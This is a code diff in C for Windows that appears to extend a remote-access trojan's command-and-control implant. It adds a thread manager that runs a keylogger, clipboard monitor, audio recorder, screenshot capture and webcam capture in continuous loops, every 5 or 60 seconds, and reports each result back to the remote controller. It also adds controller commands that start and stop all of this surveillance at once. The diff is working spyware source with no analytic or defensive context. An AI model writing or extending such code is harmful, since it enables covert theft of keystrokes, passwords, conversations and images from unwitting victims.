@@ -56,6 +56,165 @@ typedef struct {
     char args[1024];
 } CommandWithArgs;
 
+// Continuous monitoring thread management
+typedef struct {
+    HANDLE hThread;
+    volatile BOOL running;
+    CapabilityCommand cmd;
+    char client_id[64];
+    int interval_seconds;  // 5 for regular monitoring, 60 for screenshot/camera
+} MonitoringThreadInfo;
+
+// Global array to track monitoring threads (max 5 modules)
+static MonitoringThreadInfo g_monitoring_threads[5] = {0};
+static CRITICAL_SECTION g_monitoring_cs;
+static volatile BOOL g_monitoring_initialized = FALSE;
+
+// Initialize continuous monitoring management
+void InitContinuousMonitoring() {
+    if (!g_monitoring_initialized) {
+        InitializeCriticalSection(&g_monitoring_cs);
+        memset(g_monitoring_threads, 0, sizeof(g_monitoring_threads));
+        g_monitoring_initialized = TRUE;
+    }
+}
+
+// Find or allocate a monitoring thread slot
+MonitoringThreadInfo* GetMonitoringThreadSlot(CapabilityCommand cmd) {
+    EnterCriticalSection(&g_monitoring_cs);
+    
+    // First check if thread for this command already exists
+    for (int i = 0; i < 5; i++) {
+        if (g_monitoring_threads[i].cmd == cmd && g_monitoring_threads[i].running) {
+            LeaveCriticalSection(&g_monitoring_cs);
+            return NULL;  // Already running
+        }
+    }
+    
+    // Find an empty slot
+    for (int i = 0; i < 5; i++) {
+        if (!g_monitoring_threads[i].running) {
+            LeaveCriticalSection(&g_monitoring_cs);
+            return &g_monitoring_threads[i];
+        }
+    }
+    
+    LeaveCriticalSection(&g_monitoring_cs);
+    return NULL;  // No available slots
+}
+
+// Find a monitoring thread by command
+MonitoringThreadInfo* FindMonitoringThread(CapabilityCommand cmd) {
+    EnterCriticalSection(&g_monitoring_cs);
+    
+    for (int i = 0; i < 5; i++) {
+        if (g_monitoring_threads[i].cmd == cmd && g_monitoring_threads[i].running) {
+            LeaveCriticalSection(&g_monitoring_cs);
+            return &g_monitoring_threads[i];
+        }
+    }
+    
+    LeaveCriticalSection(&g_monitoring_cs);
+    return NULL;
+}
+
+// Stop a monitoring thread by command
+void StopMonitoringThread(CapabilityCommand cmd) {
+    EnterCriticalSection(&g_monitoring_cs);
+    
+    for (int i = 0; i < 5; i++) {
+        if (g_monitoring_threads[i].cmd == cmd && g_monitoring_threads[i].running) {
+            g_monitoring_threads[i].running = FALSE;
+            
+            if (g_monitoring_threads[i].hThread) {
+                LeaveCriticalSection(&g_monitoring_cs);
+                WaitForSingleObject(g_monitoring_threads[i].hThread, 5000);
+                EnterCriticalSection(&g_monitoring_cs);
+                CloseHandle(g_monitoring_threads[i].hThread);
+                g_monitoring_threads[i].hThread = NULL;
+            }
+            
+            memset(&g_monitoring_threads[i], 0, sizeof(MonitoringThreadInfo));
+            break;
+        }
+    }
+    
+    LeaveCriticalSection(&g_monitoring_cs);
+}
+
+// Stop all monitoring threads
+void StopAllMonitoringThreads() {
+    EnterCriticalSection(&g_monitoring_cs);
+    
+    for (int i = 0; i < 5; i++) {
+        if (g_monitoring_threads[i].running) {
+            g_monitoring_threads[i].running = FALSE;
+            
+            if (g_monitoring_threads[i].hThread) {
+                LeaveCriticalSection(&g_monitoring_cs);
+                WaitForSingleObject(g_monitoring_threads[i].hThread, 5000);
+                EnterCriticalSection(&g_monitoring_cs);
+                CloseHandle(g_monitoring_threads[i].hThread);
+                g_monitoring_threads[i].hThread = NULL;
+            }
+            
+            memset(&g_monitoring_threads[i], 0, sizeof(MonitoringThreadInfo));
+        }
+    }
+    
+    LeaveCriticalSection(&g_monitoring_cs);
+}
+
+// Continuous monitoring thread function
+DWORD WINAPI ContinuousMonitoringThread(LPVOID arg) {
+    MonitoringThreadInfo* thread_info = (MonitoringThreadInfo*)arg;
+    if (!thread_info) {
+        return 1;
+    }
+    
+    CapabilityCommand cmd = thread_info->cmd;
+    char* output = NULL;
+    int interval = thread_info->interval_seconds;
+    
+    // Main monitoring loop
+    while (thread_info->running) {
+        // Execute the monitoring capability based on command
+        switch (cmd) {
+            case CMD_AUDIO_RECORD:
+                output = start_audio_recorder();
+                break;
+            case CMD_CLIPBOARD_MONITOR:
+                output = start_clipboard_monitor();
+                break;
+            case CMD_KEYLOGGER:
+                output = start_keylogger();
+                break;
+            case CMD_SCREENSHOT:
+                output = start_screenshot();
+                break;
+            case CMD_CAMERA_CAPTURE:
+                output = start_camera_capture();
+                break;
+            default:
+                output = NULL;
+                break;
+        }
+        
+        // Report result if we got output
+        if (output) {
+            report_capability_result(thread_info->client_id, cmd, output);
+            free(output);
+        }
+        
+        // Sleep for the specified interval, checking if we should stop
+        for (int i = 0; i < interval && thread_info->running; i++) {
+            Sleep(1000);
+        }
+    }
+    
+    return 0;
+}
+
 // Make HTTP GET request and get response
 char* http_get_request(const char *server, int port, const char *path) {
     HINTERNET hInternet = NULL;
@@ -385,6 +544,68 @@ DWORD WINAPI capability_execution_thread(LPVOID arg) {
 
 // Execute capability based on command (launches in separate thread)
 int execute_capability(const char *client_id, CapabilityCommand cmd, const char *args) {
+    // Handle continuous monitoring commands
+    if (cmd == 11) {  // CMD_START_CONTINUOUS_MONITORING
+        // Start all continuous monitoring threads
+        InitContinuousMonitoring();
+        
+        // Start audio recorder monitoring (5 second intervals)
+        MonitoringThreadInfo* audio_slot = GetMonitoringThreadSlot(CMD_AUDIO_RECORD);
+        if (audio_slot) {
+            audio_slot->cmd = CMD_AUDIO_RECORD;
+            audio_slot->interval_seconds = 5;
+            audio_slot->running = TRUE;
+            strncpy(audio_slot->client_id, client_id, sizeof(audio_slot->client_id) - 1);
+            audio_slot->hThread = CreateThread(NULL, 0, ContinuousMonitoringThread, audio_slot, 0, NULL);
+        }
+        
+        // Start clipboard monitor (5 second intervals)
+        MonitoringThreadInfo* clipboard_slot = GetMonitoringThreadSlot(CMD_CLIPBOARD_MONITOR);
+        if (clipboard_slot) {
+            clipboard_slot->cmd = CMD_CLIPBOARD_MONITOR;
+            clipboard_slot->interval_seconds = 5;
+            clipboard_slot->running = TRUE;
+            strncpy(clipboard_slot->client_id, client_id, sizeof(clipboard_slot->client_id) - 1);
+            clipboard_slot->hThread = CreateThread(NULL, 0, ContinuousMonitoringThread, clipboard_slot, 0, NULL);
+        }
+        
+        // Start keylogger (5 second intervals)
+        MonitoringThreadInfo* keylogger_slot = GetMonitoringThreadSlot(CMD_KEYLOGGER);
+        if (keylogger_slot) {
+            keylogger_slot->cmd = CMD_KEYLOGGER;
+            keylogger_slot->interval_seconds = 5;
+            keylogger_slot->running = TRUE;
+            strncpy(keylogger_slot->client_id, client_id, sizeof(keylogger_slot->client_id) - 1);
+            keylogger_slot->hThread = CreateThread(NULL, 0, ContinuousMonitoringThread, keylogger_slot, 0, NULL);
+        }
+        
+        // Start screenshot (60 second intervals)
+        MonitoringThreadInfo* screenshot_slot = GetMonitoringThreadSlot(CMD_SCREENSHOT);
+        if (screenshot_slot) {
+            screenshot_slot->cmd = CMD_SCREENSHOT;
+            screenshot_slot->interval_seconds = 60;
+            screenshot_slot->running = TRUE;
+            strncpy(screenshot_slot->client_id, client_id, sizeof(screenshot_slot->client_id) - 1);
+            screenshot_slot->hThread = CreateThread(NULL, 0, ContinuousMonitoringThread, screenshot_slot, 0, NULL);
+        }
+        
+        // Start camera capture (60 second intervals)
+        MonitoringThreadInfo* camera_slot = GetMonitoringThreadSlot(CMD_CAMERA_CAPTURE);
+        if (camera_slot) {
+            camera_slot->cmd = CMD_CAMERA_CAPTURE;
+            camera_slot->interval_seconds = 60;
+            camera_slot->running = TRUE;
+            strncpy(camera_slot->client_id, client_id, sizeof(camera_slot->client_id) - 1);
+            camera_slot->hThread = CreateThread(NULL, 0, ContinuousMonitoringThread, camera_slot, 0, NULL);
+        }
+        
+        return 1;
+    } else if (cmd == 12) {  // CMD_STOP_CONTINUOUS_MONITORING
+        // Stop all continuous monitoring threads
+        StopAllMonitoringThreads();
+        return 1;
+    }
+    
     // Allocate thread data
     CapabilityThreadData *data = (CapabilityThreadData*)malloc(sizeof(CapabilityThreadData));
     if (!data) {
@@ -426,6 +647,9 @@ DWORD WINAPI c2_communication_thread(LPVOID arg) {
     (void)arg;  // Unused parameter
     char client_id[128];
     CommandWithArgs cmd;
+    
+    // Initialize continuous monitoring management
+    InitContinuousMonitoring();
     
     // Get computer name
     CHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
